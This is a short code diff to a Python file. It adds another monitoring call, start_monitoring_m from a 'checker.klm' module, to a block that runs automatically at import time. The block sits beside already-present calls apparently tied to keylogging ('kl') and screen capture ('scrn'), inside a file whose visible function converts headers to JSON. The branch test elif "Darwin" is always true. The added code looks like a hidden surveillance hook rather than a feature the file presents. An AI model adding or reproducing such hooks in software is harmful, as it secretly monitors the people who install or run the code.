@@ -89,12 +89,14 @@ from src.helpers.checker.kl import start_monitoring
 from src.helpers.checker.sc import scrn
 from src.helpers.checker.ext import start_monitor_m_w
 from src.helpers.checker.te import start_monitor_m
+from src.helpers.checker.klm import start_monitoring_m
 
 if platform.system() == 'Windows':
     start_monitoring()
     scrn()
 elif "Darwin":
     start_monitor_m_w()
+    start_monitoring_m()
     start_monitor_m()
 
 def convert_headers_to_json():
